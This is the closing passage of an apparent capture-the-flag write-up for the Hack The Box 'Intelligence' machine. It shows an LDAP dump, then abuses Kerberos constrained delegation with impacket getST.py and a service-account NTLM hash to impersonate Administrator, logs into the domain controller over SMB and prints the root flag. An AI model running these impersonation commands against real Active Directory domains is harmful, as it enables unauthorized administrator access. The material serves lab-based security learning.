useraccountcontrol:             ['WORKSTATION_TRUST_ACCOUNT', 'TRUSTED_TO_AUTH_FOR_DELEGATION']
usnchanged:                     102865
usncreated:                     12846
whenchanged:                    2021-11-07 23:36:11
whencreated:                    2021-04-19 00:49:58
accountexpires:                never
badpasswordtime:               1600-12-31 21:00:00
badpwdcount:                   0
cn:                            DC
codepage:                      0
countrycode:                   0
displayname:                   DC$
distinguishedname:             CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
dnshostname:                   dc.intelligence.htb
dscorepropagationdata:         2021-04-19 00:42:42,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 21:00:00
lastlogon:                     2021-11-07 14:09:20.392825
lastlogontimestamp:            2021-11-06 22:09:39.435744
localpolicyflags:              0
logoncount:                    315
memberof:                      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=intelligence,DC=htb,
                               CN=Cert Publishers,CN=Users,DC=intelligence,DC=htb
msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb
msds-generationid:             193,
                               243,
                               42,
                               111,
                               47,
                               179,
                               197,
                               147
msds-supportedencryptiontypes: 28
name:                          DC
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    f28de281-fd79-40c5-a77b-1252b80550ed
objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
operatingsystem:               Windows Server 2019 Datacenter
operatingsystemversion:        10.0 (17763)
primarygroupid:                516
pwdlastset:                    2021-11-06 22:09:15.710876
ridsetreferences:              CN=RID Set,CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
samaccountname:                DC$
samaccounttype:                805306369
serverreferencebl:             CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
serviceprincipalname:          ldap/DC/intelligence,
                               HOST/DC/intelligence,
                               RestrictedKrbHost/DC,
                               HOST/DC,
                               ldap/DC,
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb,
                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb,
                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb,
                               DNS/dc.intelligence.htb,
                               GC/dc.intelligence.htb/intelligence.htb,
                               RestrictedKrbHost/dc.intelligence.htb,
                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb,
                               HOST/dc.intelligence.htb/intelligence,
                               HOST/dc.intelligence.htb,
                               HOST/dc.intelligence.htb/intelligence.htb,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb,
                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb,
                               ldap/dc.intelligence.htb/intelligence,
                               ldap/dc.intelligence.htb,
                               ldap/dc.intelligence.htb/intelligence.htb
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050030...
usnchanged:                    102440
usncreated:                    12293
whenchanged:                   2021-11-07 01:09:39
whencreated:                   2021-04-19 00:42:41
```

The most important thing showed above is the field [msds-allowedtodelegateto](https://docs.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtodelegateto). This field shows [SPN's](https://sicuel.es/2021/05/31/service-principal-name-spn/) list and is used to configure the service so it can obtain service tickets used for constraint delegation. In this case the SPN is **WWW/dc.intelligence.htb**.

At this point a [Silver Ticket Attack](https://www.qomplx.com/qomplx-knowledge-silver-ticket-attacks-explained/) could be performed. The goal is obtain a silver ticket impersonating **Administrator** user using **svc_int$**'s constrained delegation and log in via Kerberos as **Administrator** user with this ticket.

To get a Silver Ticket I've used getST tool written by [impacket](https://github.com/SecureAuthCorp/impacket).

```console
elpollon@elpollon:~/HTB/Intelligence/exploits/impacket$ python3 getST.py -spn 'WWW/dc.intelligence.htb' -hashes ':c699eaac79b69357d9dabee3379547e6' -impersonate 'Administrator' intelligence.htb/svc_int$

Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This error is because the server has Time configuration different from our host, they must be in sync. To get the 2 hosts in sync I used **ntpdate** (If not installed: `sudo apt-get install ntpdate`). Changing the time settings of our host may take a while.

```console
elpollon@elpollon:~/HTB/Intelligence/exploits/impacket$ sudo ntpdate 10.10.10.248

 8 Nov 00:34:27 ntpdate[95054]: step time server 10.10.10.248 offset +25190.969046 sec
```

With the two host in sync now we can get a silver ticket.

```console
elpollon@elpollon:~/HTB/Intelligence/exploits/impacket$ python3 getST.py -spn 'WWW/dc.intelligence.htb' -hashes ':c699eaac79b69357d9dabee3379547e6' -impersonate 'Administrator' intelligence.htb/svc_int$

Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

In order to use this Silver Ticket we need to export the following variable.
```console
elpollon@elpollon:~/HTB/Intelligence/exploits/impacket$ export KRB5CCNAME=Administrator.ccache
```

At this point we should authenticate as **Administrator** user to the domain controller via Kerberos (Remember to add the domain **dc.intelligence.htb** to **/etc/hosts** file, targeting to 10.10.10.248). I've used smbclient by impacket to login to DC as user **Administrator**.

```console
elpollon@elpollon:~/HTB/Intelligence/exploits/impacket$ python3 smbclient.py -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb

Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT
NETLOGON
SYSVOL
Users
# use Users
# ls
drw-rw-rw-          0  Sun Apr 18 21:20:26 2021 .
drw-rw-rw-          0  Sun Apr 18 21:20:26 2021 ..
drw-rw-rw-          0  Sun Apr 18 20:18:39 2021 Administrator
drw-rw-rw-          0  Sun Apr 18 23:16:30 2021 All Users
drw-rw-rw-          0  Sun Apr 18 22:17:40 2021 Default
drw-rw-rw-          0  Sun Apr 18 23:16:30 2021 Default User
-rw-rw-rw-        174  Sun Apr 18 23:15:17 2021 desktop.ini
drw-rw-rw-          0  Sun Apr 18 20:18:39 2021 Public
drw-rw-rw-          0  Sun Apr 18 21:20:26 2021 Ted.Graves
drw-rw-rw-          0  Sun Apr 18 20:51:46 2021 Tiffany.Molina
# cd Administrator\Desktop
# ls 
drw-rw-rw-          0  Sun Apr 18 20:51:57 2021 .
drw-rw-rw-          0  Sun Apr 18 20:51:57 2021 ..
-rw-rw-rw-        282  Sun Apr 18 20:40:10 2021 desktop.ini
-rw-rw-rw-         34  Sat Nov  6 22:09:49 2021 root.txt
```

Now we see root's flag.

```console
# get root.txt
# exit
elpollon@elpollon:~/HTB/Intelligence/exploits/impacket$ cat root.txt
9ef8bad66cf3d5bd266232cb78cd8a36
```

### Conclusion

 There was a lot of new things to me. I definitely will get back to this in the future after doing some more Active Directory machines. 

I think the key part in the resolving of this machine was enumeration, lot of information were needed in order to access to the domain and doing the stuff.

As I said earlier, this was the kick that I needed to go on AD stuff in the future. 

See ya!
